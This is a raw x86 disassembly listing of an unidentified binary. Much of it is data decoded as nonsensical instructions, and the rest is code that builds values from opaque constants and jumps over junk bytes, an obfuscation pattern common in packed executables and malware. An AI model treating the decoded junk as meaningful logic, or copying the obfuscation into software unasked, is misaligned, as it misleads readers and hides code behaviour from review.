  40f11b:	mov    ebp,0x8eb7215e
  40f120:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f121:	jecxz  0x40f16f
  40f123:	shl    BYTE PTR [edx-0xf60df1c],1
  40f129:	daa    
  40f12a:	jle    0x40f0fd
  40f12c:	sub    al,0x99
  40f12e:	call   0xf4b50cf4
  40f133:	inc    eax
  40f134:	and    bh,ch
  40f136:	sbb    eax,0x137aa694
  40f13b:	out    0x0,al
  40f13d:	push   es
  40f13e:	sbb    ecx,esi
  40f140:	pop    ebp
  40f141:	es aaa 
  40f143:	lods   eax,DWORD PTR ds:[esi]
  40f144:	add    eax,0xf5b59f1
  40f149:	stos   BYTE PTR es:[edi],al
  40f14a:	rcl    DWORD PTR [ebx-0x7c],cl
  40f14d:	jnp    0x40f119
  40f14f:	out    0xa5,al
  40f151:	add    al,0x95
  40f153:	lds    ecx,FWORD PTR [ebx+0x37ff020e]
  40f159:	xchg   esp,eax
  40f15a:	dec    eax
  40f15b:	arpl   WORD PTR [edx],dx
  40f15d:	sub    esp,DWORD PTR [eax-0x3f]
  40f160:	repnz out 0xc2,al
  40f163:	sbb    ebp,edi
  40f165:	jno    0x40f19b
  40f167:	stos   BYTE PTR es:[edi],al
  40f168:	mov    esi,0xde7bb6dc
  40f16d:	js     0x40f111
  40f16f:	iret   
  40f170:	lock cmp dh,BYTE PTR [ebx-0x2fac5e65]
  40f177:	int3   
  40f178:	sub    bh,BYTE PTR [eax-0x2a308dda]
  40f17e:	test   DWORD PTR [edx],0x3ef7a92c
  40f184:	pusha  
  40f185:	mov    al,0xa8
  40f187:	cmp    al,0x5b
  40f189:	jmp    0x40f1a9
  40f18b:	ins    BYTE PTR es:[edi],dx
  40f18c:	inc    eax
  40f18d:	inc    esp
  40f18e:	pop    ebp
  40f18f:	fild   DWORD PTR [ebx]
  40f191:	ja     0x40f175
  40f193:	xor    BYTE PTR [ebx],al
  40f195:	clc    
  40f196:	in     eax,0xf6
  40f198:	adc    eax,0x92d81384
  40f19d:	hlt    
  40f19e:	in     al,dx
  40f19f:	sbb    DWORD PTR [ecx-0x6c],ebx
  40f1a2:	sbb    eax,DWORD PTR [ecx+0x6e]
  40f1a5:	mov    esi,0xf0398353
  40f1aa:	aaa    
  40f1ab:	in     eax,0x9
  40f1ad:	lods   eax,DWORD PTR ds:[esi]
  40f1ae:	enter  0x3d60,0xf6
  40f1b2:	hlt    
  40f1b3:	xchg   BYTE PTR [ecx],ch
  40f1b5:	ins    BYTE PTR es:[edi],dx
  40f1b6:	js     0x40f13f
  40f1b8:	(bad)  
  40f1b9:	push   0x6c459278
  40f1be:	ret    0x2bca
  40f1c1:	in     al,dx
  40f1c2:	aam    0x20
  40f1c4:	fwait
  40f1c5:	fwait
  40f1c6:	daa    
  40f1c7:	inc    ebp
  40f1c8:	xchg   esi,eax
  40f1c9:	add    al,0xa6
  40f1cb:	sbb    dh,0x31
  40f1ce:	sub    al,0xdf
  40f1d0:	adc    BYTE PTR [edi-0x2df0eaff],ah
  40f1d6:	ficom  DWORD PTR [eax]
  40f1d8:	sub    ecx,edi
  40f1da:	in     eax,0x70
  40f1dc:	in     al,0xce
  40f1de:	push   ds
  40f1df:	psrlw  mm3,QWORD PTR [ebx]
  40f1e2:	out    dx,al
  40f1e3:	outs   dx,DWORD PTR ds:[esi]
  40f1e4:	(bad)  
  40f1e5:	jp     0x40f1ca
  40f1e7:	scas   eax,DWORD PTR es:[edi]
  40f1e8:	jae    0x40f226
  40f1ea:	shr    ch,cl
  40f1ec:	cs (bad) 
  40f1ee:	jb     0x40f1be
  40f1f0:	cmp    al,0xd7
  40f1f2:	cmp    al,0x6e
  40f1f4:	aaa    
  40f1f5:	cmc    
  40f1f6:	gs int3 
  40f1f8:	pop    ecx
  40f1f9:	imul   ecx,DWORD PTR [ecx],0xa79ad660
  40f1ff:	sub    ah,BYTE PTR [edi+0x59]
  40f202:	pop    es
  40f203:	test   eax,0x263ce3d6
  40f208:	xor    edi,edi
  40f20a:	mov    WORD PTR [ebx],cs
  40f20c:	xor    BYTE PTR [eax],dh
  40f20e:	in     al,0x93
  40f210:	xor    al,0x7
  40f212:	inc    ebp
  40f213:	popf   
  40f214:	and    bl,BYTE PTR [ebp-0x3195e219]
  40f21a:	dec    ecx
  40f21b:	fimul  WORD PTR [eax-0x155f4a93]
  40f221:	sbb    al,0x1
  40f223:	mov    cl,0x22
  40f225:	mov    ds:0xa4b5ed8,eax
  40f22a:	loop   0x40f26f
  40f22c:	jno    0x40f224
  40f22e:	xchg   edx,eax
  40f22f:	jae    0x40f214
  40f231:	outs   dx,BYTE PTR ds:[esi]
  40f232:	and    BYTE PTR [edi],ah
  40f234:	cdq    
  40f235:	ins    DWORD PTR es:[edi],dx
  40f236:	adc    al,0x7d
  40f238:	add    edx,DWORD PTR [eax+0x7674f243]
  40f23e:	push   ecx
  40f23f:	xor    al,0x84
  40f241:	mov    dl,0xb5
  40f243:	loop   0x40f221
  40f245:	dec    edi
  40f246:	push   ss
  40f247:	xor    ecx,DWORD PTR [ecx-0x4559f916]
  40f24d:	jne    0x40f212
  40f24f:	pushf  
  40f250:	out    0xeb,al
  40f252:	add    DWORD PTR [ebx+edx*4-0x6adc7775],eax
  40f259:	push   0x71
  40f25b:	push   0x58
  40f25d:	cli    
  40f25e:	pop    ds
  40f25f:	in     eax,0xc7
  40f261:	push   ss
  40f262:	inc    esi
  40f263:	push   cs
  40f264:	xlat   BYTE PTR ds:[ebx]
  40f265:	or     al,0xe5
  40f267:	test   al,0x51
  40f269:	push   ds
  40f26a:	xchg   esp,eax
  40f26b:	and    eax,DWORD PTR [ecx-0x51c618f2]
  40f271:	aad    0x86
  40f273:	out    0x1d,al
  40f275:	(bad)  
  40f276:	mov    esi,0x262f0d8b
  40f27b:	rol    BYTE PTR [edx+edx*8+0x2e21952d],cl
  40f282:	(bad)  
  40f283:	out    dx,al
  40f284:	xchg   ecx,eax
  40f285:	arpl   si,bp
  40f287:	push   edx
  40f288:	jle    0x40f26f
  40f28a:	adc    dl,BYTE PTR [ebx+edi*4+0x23]
  40f28e:	lods   al,BYTE PTR ds:[esi]
  40f28f:	cmp    ch,BYTE PTR [ecx+edx*1-0x25a0332]
  40f296:	add    BYTE PTR [esi+0x1faa1bd3],dh
  40f29c:	into   
  40f29d:	fstp   TBYTE PTR cs:[ebx-0x56]
  40f2a1:	ins    DWORD PTR es:[edi],dx
  40f2a2:	jle    0x40f314
  40f2a4:	pop    esi
  40f2a5:	dec    eax
  40f2a6:	xchg   esp,eax
  40f2a7:	mov    ebx,0xab57a50
  40f2ac:	or     ecx,0xffffffd1
  40f2af:	ins    DWORD PTR es:[edi],dx
  40f2b0:	or     al,0xba
  40f2b2:	iret   
  40f2b3:	scas   eax,DWORD PTR es:[edi]
  40f2b4:	sub    al,0x3b
  40f2b6:	daa    
  40f2b7:	call   0x58f0:0x320e1978
  40f2be:	adc    eax,0x9430e42e
  40f2c3:	arpl   WORD PTR [esi-0x418058c2],dx
  40f2c9:	mov    ds:0x98607e6d,al
  40f2ce:	outs   dx,BYTE PTR ds:[esi]
  40f2cf:	xor    al,0xc6
  40f2d1:	inc    esi
  40f2d2:	ret    0xbbc4
  40f2d5:	and    DWORD PTR ss:[esi],edi
  40f2d8:	adc    al,0x23
  40f2da:	or     DWORD PTR ds:0x2dc3c558,ebx
  40f2e0:	and    al,0x8b
  40f2e2:	daa    
  40f2e3:	mov    bh,0x4b
  40f2e5:	sub    al,0x55
  40f2e7:	jno    0x40f29c
  40f2e9:	in     al,0xe3
  40f2eb:	mov    esp,0x2914d672
  40f2f0:	inc    ebp
  40f2f1:	loope  0x40f328
  40f2f3:	ins    BYTE PTR es:[edi],dx
  40f2f4:	mov    ecx,edi
  40f2f6:	lea    edx,cs:[ebp-0x6edcfaa7]
  40f2fd:	pop    ds
  40f2fe:	ds inc esp
  40f300:	out    dx,al
  40f301:	jno    0x40f2ca
  40f303:	jbe    0x40f32c
  40f305:	stos   BYTE PTR es:[edi],al
  40f306:	and    edx,0x1d
  40f309:	imul   edx,DWORD PTR [eax],0xffffff8b
  40f30c:	add    DWORD PTR [ebx+0x7d060e43],edi
  40f312:	xor    edx,ebp
  40f314:	ins    BYTE PTR es:[edi],dx
  40f315:	clc    
  40f316:	jmp    0xdfb8:0xa59b4212
  40f31d:	cwde   
  40f31e:	jno    0x40f312
  40f320:	mov    ds:0xad5c4a9a,eax
  40f325:	in     eax,0x88
  40f327:	mov    ebx,0x12b43351
  40f32c:	sub    DWORD PTR [eax],esi
  40f32e:	xor    ah,BYTE PTR ds:0xeeb539f5
  40f334:	shr    BYTE PTR [esi-0x8],cl
  40f337:	fs mov esp,0x62f4fd23
  40f33d:	(bad)  
  40f33e:	je     0x40f344
  40f340:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f341:	stc    
  40f342:	push   ss
  40f343:	and    DWORD PTR [ecx-0xe],ebp
  40f346:	jmp    0x40f32a
  40f348:	(bad)  
  40f349:	cmp    DWORD PTR [edi+0x24],esp
  40f34c:	mov    bh,0xe0
  40f34e:	pop    eax
  40f34f:	add    BYTE PTR [esi+0x5b],bl
  40f352:	leave  
  40f353:	ret    0xc
  40f356:	push   ebp
  40f357:	mov    ebp,esp
  40f359:	sub    esp,0xec
  40f35f:	push   ebx
  40f360:	push   esi
  40f361:	mov    DWORD PTR [ebp-0x8],0x548e
  40f368:	mov    DWORD PTR [ebp-0x4],0x61c2
  40f36f:	mov    eax,DWORD PTR [ebp-0x4]
  40f372:	jmp    0x40f640
  40f377:	outs   dx,BYTE PTR ds:[esi]
  40f378:	rol    BYTE PTR [eax],cl
  40f37a:	jnp    0x40f399
  40f37c:	cmp    ch,BYTE PTR [edx-0x5e]
  40f37f:	ret    0x499f
  40f382:	push   0x21
  40f384:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f385:	pop    ecx
  40f386:	stos   BYTE PTR es:[edi],al
  40f387:	sub    ebp,DWORD PTR [eax+0x14be1818]
  40f38d:	sbb    BYTE PTR [eax],bl
  40f38f:	popa   
  40f390:	and    ecx,DWORD PTR ds:0xd6708d27
  40f396:	arpl   WORD PTR [edi-0x6a],bp
  40f399:	js     0x40f340
  40f39b:	cli    
  40f39c:	(bad)  
  40f39d:	aas    
  40f39e:	push   ebx
  40f39f:	cld    
  40f3a0:	clc    
  40f3a1:	mov    ds:0x2644077f,al
  40f3a6:	into   
  40f3a7:	popa   
  40f3a8:	repnz fwait
  40f3aa:	inc    esi
  40f3ab:	add    bh,BYTE PTR [ecx-0x45]
  40f3ae:	sub    al,0xf6
  40f3b0:	xchg   edi,eax
  40f3b1:	shl    DWORD PTR [edx+0x78b14d5f],1
  40f3b7:	push   cs
  40f3b8:	(bad)  
  40f3b9:	mov    ebp,0xfe8738cf
  40f3be:	jno    0x40f413
  40f3c0:	scas   eax,DWORD PTR es:[edi]
  40f3c1:	mov    al,ds:0x4d18b2e8
  40f3c6:	xor    BYTE PTR [edx+ecx*4+0xbb37478],ah
  40f3cd:	or     DWORD PTR [ebp-0x1718f085],0x705faa1a
  40f3d7:	sub    BYTE PTR [esi-0x3c727e53],al
  40f3dd:	lods   al,BYTE PTR ds:[esi]
  40f3de:	add    bh,cl
  40f3e0:	js     0x40f42a
  40f3e2:	mov    al,ds:0xa353005c
  40f3e7:	es jo  0x40f3c1
  40f3ea:	pushf  
  40f3eb:	out    dx,eax
  40f3ec:	pop    esi
  40f3ed:	push   edi
  40f3ee:	aas    
  40f3ef:	nop
  40f3f0:	aaa    
  40f3f1:	dec    eax
  40f3f2:	mov    edx,0xa52250de
  40f3f7:	mov    edx,DWORD PTR [esi+0x191cdfb6]
  40f3fd:	es pop eax
  40f3ff:	aas    
  40f400:	stc    
  40f401:	add    ah,ah
  40f403:	push   0x3ee31df0
  40f408:	jae    0x40f3bc
  40f40a:	retf   0x7d44
  40f40d:	xchg   ebx,eax
  40f40e:	sti    
  40f40f:	cmp    al,0x9
  40f411:	ja     0x40f413
  40f413:	call   FWORD PTR [esi+0x5d71e75b]
  40f419:	(bad)  [eax]
  40f41b:	sbb    eax,0xde340130
  40f420:	inc    esp
  40f421:	fcom   QWORD PTR [ecx+0x6afb2ed2]
  40f427:	imul   eax,DWORD PTR [ebp+0x34],0x4b
  40f42b:	ja     0x40f432
  40f42d:	mov    DWORD PTR [ecx],ebp
  40f42f:	mov    DWORD PTR [ebp-0x245ea888],ecx
  40f435:	push   ecx
  40f436:	shl    ah,cl
  40f438:	icebp  
  40f439:	repnz out 0xbe,al
  40f43c:	cmc    
  40f43d:	and    ebx,edx
  40f43f:	or     eax,0xbb9c0d3e
  40f444:	dec    ebp
  40f445:	sbb    edx,esp
  40f447:	lods   al,BYTE PTR ds:[esi]
  40f448:	cli    
  40f449:	cmp    al,0xbb
  40f44b:	mov    dl,0x5d
  40f44d:	mov    bl,BYTE PTR [ebp-0x70]
  40f450:	repnz mov al,ds:0x6811c019
  40f456:	popa   
  40f457:	adc    ebx,DWORD PTR [edi-0x7dd5bf50]
  40f45d:	in     eax,0xca
  40f45f:	push   ebp
  40f460:	ja     0x40f444
  40f462:	xchg   esi,eax
  40f463:	shr    DWORD PTR [edx],1
  40f465:	aas    
  40f466:	jge    0x40f3fb
  40f468:	rol    DWORD PTR [edi-0x61e5de48],cl
  40f46e:	fwait
  40f46f:	mov    bl,0xac
  40f471:	cmp    al,0xd3
  40f473:	das    
  40f474:	mov    bh,0x2
  40f476:	enter  0x4a0d,0x2d
  40f47a:	mov    edx,0xff96def
  40f47f:	int    0xb9
  40f481:	retf   
  40f482:	nop    DWORD PTR [edx+0x1]
  40f486:	mov    dh,0xa5
  40f488:	fild   DWORD PTR [edi]
  40f48a:	mov    dh,0x1f
  40f48c:	adc    esi,DWORD PTR [edx]
  40f48e:	mov    eax,DWORD PTR [edi]
  40f490:	mov    BYTE PTR [edx-0x5ed4a535],cl
  40f496:	in     eax,dx
  40f497:	inc    esi
  40f498:	scas   al,BYTE PTR es:[edi]
  40f499:	lds    esi,FWORD PTR [ecx-0x2854dd18]
  40f49f:	xchg   esp,eax
  40f4a0:	xchg   esi,eax
  40f4a1:	or     dl,dl
  40f4a3:	dec    ebp
  40f4a4:	sbb    ecx,eax
  40f4a6:	pop    es
  40f4a7:	jae    0x40f48e
  40f4a9:	or     BYTE PTR cs:[eax-0x1e],bh
  40f4ad:	data16 (bad) 
  40f4af:	push   ds
  40f4b0:	xor    cl,cl
  40f4b2:	push   cs
  40f4b3:	push   0x5c
  40f4b5:	pushf  
  40f4b6:	not    DWORD PTR [ecx]
  40f4b8:	arpl   WORD PTR ds:0x6a630472,di
  40f4be:	lods   eax,DWORD PTR ds:[esi]
  40f4bf:	mov    ecx,0x34cc7c10
  40f4c4:	add    esi,DWORD PTR [ebx+0x6b]
  40f4c7:	mov    edi,0xa53c46b2
  40f4cc:	loopne 0x40f4fb
  40f4ce:	or     DWORD PTR [edx+esi*8-0xb],edi
  40f4d2:	jae    0x40f553
  40f4d4:	add    DWORD PTR [edi],ebx
  40f4d6:	or     ecx,edi
  40f4d8:	xchg   ebp,eax
  40f4d9:	xchg   ecx,eax
  40f4da:	sbb    dh,BYTE PTR [ecx]
  40f4dc:	cmp    al,0xa6
  40f4de:	and    bl,BYTE PTR [ecx+0x7a]
  40f4e1:	(bad)  
  40f4e2:	pop    eax
  40f4e3:	push   ds
  40f4e4:	mov    ds:0x2cadf08d,al
  40f4e9:	mov    eax,ds:0xea6e6013
  40f4ee:	add    eax,0x740de2bb
  40f4f3:	and    eax,DWORD PTR [ecx]
  40f4f5:	adc    eax,DWORD PTR [ebx]
  40f4f7:	ror    edi,cl
  40f4f9:	dec    eax
  40f4fa:	cmp    dl,dl
  40f4fc:	mov    bh,BYTE PTR [eax-0x1f]
  40f4ff:	enter  0x5ab3,0x94
  40f503:	idiv   DWORD PTR [esi-0xed7cec3]
  40f509:	jne    0x40f4f5
  40f50b:	pop    ecx
  40f50c:	inc    esp
  40f50d:	inc    ebp
  40f50e:	dec    esp
  40f50f:	sbb    esi,ecx
  40f511:	push   cs
  40f512:	fmul   DWORD PTR [esi+0xc3641ca]
  40f518:	fild   DWORD PTR ds:0xd3b06994
  40f51e:	mov    esi,0x3addecc6
  40f523:	mov    bl,0xb2
  40f525:	mov    ds:0x381de0e7,eax
  40f52a:	or     BYTE PTR [ebx],al
  40f52c:	mov    al,0x60
  40f52e:	push   ecx
  40f52f:	imul   edx,DWORD PTR [ecx-0x614d55],0x7e182877
  40f539:	pop    es
  40f53a:	xchg   esi,eax
  40f53b:	out    dx,eax
  40f53c:	jge    0x40f4db
  40f53e:	arpl   WORD PTR [esi+0x7531718d],di
  40f544:	sbb    edi,DWORD PTR [esp+esi*1]
  40f547:	mov    dl,0x4b
  40f549:	adc    eax,0xa175268e
  40f54e:	push   es
  40f54f:	jne    0x40f556
  40f551:	ret    0xf683
  40f554:	push   es
  40f555:	shl    DWORD PTR [edx+eiz*2-0x13],cl
  40f559:	ss cmp esp,ecx
  40f55c:	or     esp,DWORD PTR [esi+0xa61a909]
  40f562:	idiv   bh
  40f564:	call   0x6872865c
  40f569:	or     al,0xa0
  40f56b:	in     eax,dx
  40f56c:	in     al,dx
  40f56d:	pop    es
  40f56e:	(bad)  
  40f56f:	jnp    0x40f542
  40f571:	mov    al,0x26
  40f573:	outs   dx,DWORD PTR ds:[esi]
  40f574:	cmp    BYTE PTR [edx+0x4d],bl
  40f577:	es pop ss
  40f579:	or     DWORD PTR [ecx],edx
  40f57b:	out    0x11,al
  40f57d:	lods   al,BYTE PTR ds:[esi]
  40f57e:	sub    DWORD PTR [edx+0x29],0xd2d7b313
  40f585:	push   0xec039fc2
  40f58a:	xor    esi,DWORD PTR [esi+ebp*8-0x1a3607f2]
  40f591:	loope  0x40f5b5
  40f593:	jmp    0x682:0x97606c45
  40f59a:	fcmovnbe st,st(5)
  40f59c:	dec    ebx
  40f59d:	push   eax
  40f59e:	lock add ah,cl
  40f5a1:	mov    esp,0x82f3fcd0
  40f5a6:	(bad)  
  40f5a7:	mov    al,ds:0x9943c5e2
  40f5ac:	sbb    cl,0xca
  40f5af:	retf   
  40f5b0:	fwait
  40f5b1:	xor    cl,BYTE PTR [eax+0x3e81ff04]
  40f5b7:	dec    esi
  40f5b8:	bound  esi,QWORD PTR [esi]
  40f5ba:	inc    eax
  40f5bb:	sub    al,0x2
  40f5bd:	(bad)  
  40f5bf:	dec    ebx
  40f5c0:	push   eax
  40f5c1:	push   ebp
  40f5c2:	pop    ebx
  40f5c3:	adc    DWORD PTR [edx],0xffffffb8
  40f5c6:	imul   edx,eax,0x9d56bf67
  40f5cc:	sti    
  40f5cd:	cmp    eax,0xca8e8e4f
  40f5d2:	xor    dh,BYTE PTR [esi+0x814c4d6]
  40f5d8:	dec    ebp
  40f5d9:	add    eax,0x270804b2
  40f5de:	add    BYTE PTR [edi-0x2e],ah
  40f5e1:	shr    DWORD PTR [edi+0x2],1
  40f5e4:	dec    esi
  40f5e5:	add    edx,DWORD PTR [ecx-0x23]
  40f5e8:	push   0xffffff9f
  40f5ea:	push   ebp
  40f5eb:	push   es
  40f5ec:	fs ins DWORD PTR es:[edi],dx
  40f5ee:	dec    edx
  40f5ef:	xor    eax,0x97ff88c6
  40f5f4:	fnsave [edx]
  40f5f6:	inc    ebx
  40f5f7:	js     0x40f586
  40f5f9:	mov    esi,0xdc1218f8
  40f5fe:	jecxz  0x40f5da
  40f600:	int    0x74
  40f602:	sub    al,0xb2
  40f604:	dec    edx
  40f605:	cmp    eax,0xf991d9a3
  40f60a:	sti    
  40f60b:	push   ebx
  40f60c:	in     eax,0xdc
  40f60e:	ja     0x40f5d8
  40f610:	daa    
  40f611:	out    dx,eax
  40f612:	daa    
  40f613:	sahf   
  40f614:	cmp    ebp,edx
  40f616:	jno    0x40f5a4
  40f618:	ss std 
  40f61a:	dec    ebx
  40f61b:	or     edi,edi
  40f61d:	pop    eax
  40f61e:	leave  
  40f61f:	mov    dh,0xbe
  40f621:	add    dh,BYTE PTR [ebx-0xa]
  40f624:	fld    TBYTE PTR [esi+eiz*8+0x51]
  40f628:	cmp    esp,edi
  40f62a:	iret   
  40f62b:	jbe    0x40f636
  40f62d:	out    dx,eax
  40f62e:	xchg   BYTE PTR [eax-0x7f],bh
  40f631:	xchg   ecx,eax
  40f632:	xor    bl,bl
  40f634:	repnz inc ecx
  40f636:	add    DWORD PTR [ebx+0x64],eax
  40f639:	rcr    DWORD PTR [edi-0x55780087],cl
  40f63f:	mov    ch,0x8b
  40f641:	dec    ebp
  40f642:	clc    
  40f643:	add    eax,0x1ca5
  40f648:	or     eax,ecx
  40f64a:	mov    ecx,DWORD PTR ds:0x422568
  40f650:	lea    eax,[eax+ecx*1-0x7eef]
  40f657:	mov    DWORD PTR [ebp-0x5c],eax
  40f65a:	mov    DWORD PTR [ebp-0x4],0x8ea
  40f661:	mov    DWORD PTR [ebp-0x8],0x5759
  40f668:	mov    eax,DWORD PTR [ebp-0x8]
  40f66b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f66e:	and    eax,0x27f6
  40f673:	xor    eax,ecx
  40f675:	mov    ecx,DWORD PTR ds:0x42269c
  40f67b:	imul   eax,eax,0x18
  40f67e:	xor    eax,0x17970
  40f683:	lea    eax,[ebp+eax*1-0x54]
  40f687:	mov    DWORD PTR [eax],ecx
  40f689:	mov    DWORD PTR [ebp-0x4],0x7584
  40f690:	mov    DWORD PTR [ebp-0x8],0x7c9f
  40f697:	mov    eax,DWORD PTR [ebp-0x8]
  40f69a:	xor    edx,edx
  40f69c:	push   0x3
  40f69e:	pop    ecx
  40f69f:	div    ecx
  40f6a1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6a4:	xor    edx,edx
  40f6a6:	push   0x2
  40f6a8:	add    eax,0x14d3
  40f6ad:	and    eax,ecx
  40f6af:	mov    ecx,0x6404
  40f6b4:	sub    ecx,eax
  40f6b6:	mov    DWORD PTR [ebp-0x74],ecx
  40f6b9:	mov    DWORD PTR [ebp-0xc],0x13b5
  40f6c0:	mov    DWORD PTR [ebp-0x8],0x2e54
  40f6c7:	mov    DWORD PTR [ebp-0x4],0x2f11
  40f6ce:	mov    eax,DWORD PTR [ebp-0x8]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6d4:	lea    eax,[ecx+eax*1-0x65ec]
  40f6db:	mov    ecx,0x5e208
  40f6e0:	div    ecx
  40f6e2:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e5:	lea    eax,[eax+ecx*1+0x40c7]
  40f6ec:	mov    DWORD PTR [ebp-0x24],eax
  40f6ef:	mov    DWORD PTR [ebp-0x4],0x1bc6
  40f6f6:	mov    DWORD PTR [ebp-0x8],0x16ac
  40f6fd:	mov    DWORD PTR [ebp-0xc],0x2185
  40f704:	mov    eax,DWORD PTR [ebp-0xc]
  40f707:	mov    ecx,DWORD PTR [ebp-0x8]
  40f70a:	xor    eax,0x1f75
  40f70f:	sub    eax,ecx
  40f711:	mov    ecx,DWORD PTR [ebp-0x4]
  40f714:	jmp    0x40f9e2
  40f719:	mov    ch,0xd2
  40f71b:	pop    edx
  40f71c:	mov    BYTE PTR [edx+0x20],bl
  40f71f:	stos   DWORD PTR es:[edi],eax
  40f720:	and    dl,BYTE PTR [edx+0x34]
  40f723:	sbb    BYTE PTR [edx+0x70d1183a],ch
  40f729:	shl    DWORD PTR [edx+0x14be1818],1
  40f72f:	sbb    BYTE PTR [eax],bl
  40f731:	neg    dh
  40f733:	in     eax,dx
  40f734:	xor    BYTE PTR [edi+0x20],al
  40f737:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f738:	rol    DWORD PTR [edi+esi*2],0xb4
  40f73c:	inc    ecx
  40f73d:	mov    cl,0xdf
  40f73f:	nop
  40f740:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f741:	daa    
  40f742:	push   esp
  40f743:	(bad)  
  40f744:	fsubrp st(1),st
  40f746:	loopne 0x40f786
  40f748:	mov    DWORD PTR [edi-0x48437e9d],0x1b6f3198
  40f752:	mov    ds:0xd9235f2a,eax
  40f757:	mov    esp,0x20c7bf26
  40f75c:	lahf   
  40f75d:	sub    dh,BYTE PTR [esp+edx*4-0x3c]
  40f761:	fs mov bl,0xda
  40f764:	mov    bl,0x45
  40f766:	mov    ebp,0x8d49e149
  40f76b:	nop
  40f76c:	mov    ?,esi
  40f76e:	sbb    eax,0xc6469657
  40f773:	xlat   BYTE PTR ds:[ebx]
  40f774:	int    0x0
  40f776:	sbb    BYTE PTR [edi-0x4d],0x9
  40f77a:	add    eax,0x41f79569
  40f77f:	lea    eax,[edi+ebp*2]
  40f782:	repnz in al,0x1d
  40f785:	inc    ecx
  40f786:	jne    0x40f73d
  40f788:	fisttp DWORD PTR [ebp-0x6b1f135a]
  40f78e:	loop   0x40f76c
  40f790:	sar    DWORD PTR [ecx-0x479090fa],cl
  40f796:	pusha  
  40f797:	enter  0x1e7,0xc1
  40f79b:	cli    
  40f79c:	cmp    DWORD PTR [eax-0x1b],ecx
  40f79f:	mov    ?,WORD PTR [esi]
  40f7a1:	(bad)  
  40f7a2:	cmp    eax,0xd3e8c1e7
  40f7a7:	mov    ebx,0xee8550f3
  40f7ac:	nop
  40f7ad:	or     bh,al
  40f7af:	(bad)
  40f7b3:	add    eax,0xdf77f07e
  40f7b8:	pushf  
  40f7b9:	int    0x2f
  40f7bb:	(bad)  [eax]
  40f7bd:	inc    esi
  40f7be:	sbb    ah,dl
  40f7c0:	or     BYTE PTR [eax],0x48
  40f7c3:	mov    eax,ds:0xbbe9a658
  40f7c8:	mov    WORD PTR [ebp-0x3f],ds
  40f7cb:	cmp    ch,cl
  40f7cd:	pop    eax
  40f7ce:	jbe    0x40f77d
  40f7d0:	mov    ah,0x53
  40f7d2:	jge    0x40f7da
  40f7d4:	inc    edi
  40f7d5:	push   eax
  40f7d6:	cli    
  40f7d7:	push   ebx
  40f7d8:	pop    edi
  40f7d9:	aad    0x26
  40f7db:	outs   dx,BYTE PTR ds:[esi]
  40f7dc:	popf   
  40f7dd:	ins    DWORD PTR es:[edi],dx
  40f7de:	pop    esp
  40f7df:	das    
  40f7e0:	push   ebx
  40f7e1:	sahf   
  40f7e2:	loop   0x40f854
  40f7e4:	xchg   esi,eax
  40f7e5:	add    bl,cl
  40f7e7:	mov    edx,0x8694c0d0
  40f7ec:	fmul   st,st(3)
  40f7ee:	inc    ebx
  40f7ef:	gs pop ds
  40f7f1:	xor    BYTE PTR [esp+edx*8-0x70],ah
  40f7f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7f6:	mov    BYTE PTR [edi],al
  40f7f8:	and    DWORD PTR ds:0x442764c2,esi
  40f7fe:	fadd   DWORD PTR [edx]
  40f800:	xlat   BYTE PTR ds:[ebx]
  40f801:	push   cs
  40f802:	dec    esi
  40f803:	sub    BYTE PTR [edi+0x46e1f9c8],ah
  40f809:	push   es
  40f80a:	cmp    al,0x7d
  40f80c:	push   edx
  40f80d:	in     eax,0x25
  40f80f:	and    eax,0xbee374f7
  40f814:	push   cs
  40f815:	xchg   edx,eax
  40f816:	ja     0x40f882
  40f818:	jmp    0x40f832
  40f81a:	jne    0x40f831
  40f81c:	fild   DWORD PTR [ebx+0x3b]
  40f81f:	retf   0xd9ff
  40f822:	lods   al,BYTE PTR ds:[esi]
  40f823:	retf   0xd0c9
  40f826:	or     DWORD PTR [esi-0x65bb6399],edx
  40f82c:	mov    ch,0x68
  40f82e:	aaa    
  40f82f:	and    al,0x48
  40f831:	mov    ch,0x58
  40f833:	xchg   ecx,eax
  40f834:	test   bh,cl
  40f836:	adc    esp,DWORD PTR [ebp-0x3d5cc158]
  40f83c:	mov    esi,0x674c9658
  40f841:	lea    esi,[esi+ebx*1+0x2d]
  40f845:	aas    
  40f846:	and    BYTE PTR [edx],dl
  40f848:	cld    
  40f849:	retf   0xcc90
  40f84c:	push   0x74
  40f84e:	xor    edi,DWORD PTR [ebp-0x5b8d3a78]
  40f854:	mov    edi,0x98ce776e
  40f859:	mov    esi,0xe4ec7e4b
  40f85e:	stos   BYTE PTR es:[edi],al
  40f85f:	pop    ecx
  40f860:	in     eax,dx
  40f861:	es std 
  40f863:	out    dx,al
  40f864:	lods   eax,DWORD PTR ds:[esi]
  40f865:	setae  BYTE PTR [ebp+0x5f98ae70]
  40f86c:	mul    BYTE PTR [eax+0xbd2a73e]
  40f872:	pop    edx
  40f873:	sub    al,0x94
  40f875:	repz repnz adc al,0x2a
  40f879:	dec    esp
  40f87a:	sbb    al,0x13
  40f87c:	or     DWORD PTR [ebp+ebx*4-0x13],edx
  40f880:	mov    esi,0x41d5676b
  40f885:	mov    BYTE PTR [edi],bl
  40f887:	inc    edx
  40f888:	test   al,0xce
  40f88a:	mov    esp,0xe58fdb37
  40f88f:	jae    0x40f882
  40f891:	push   ss
  40f892:	jg     0x40f8ad
  40f894:	outs   dx,BYTE PTR ds:[esi]
  40f895:	jnp    0x40f878
  40f897:	cmc    
  40f898:	xor    eax,DWORD PTR [ecx+0x3a]
  40f89b:	add    bl,bh
  40f89d:	xchg   ecx,eax
  40f89e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f89f:	or     al,0x2b
  40f8a1:	adc    DWORD PTR [eax+ecx*2],ebx
  40f8a4:	cdq    
  40f8a5:	mov    bl,0xc1
  40f8a7:	scas   al,BYTE PTR es:[edi]
  40f8a8:	push   0x34d60271
  40f8ad:	mov    ss,WORD PTR [ebx+ecx*8+0x5d557667]
  40f8b4:	jnp    0x40f8fa
  40f8b6:	inc    esi
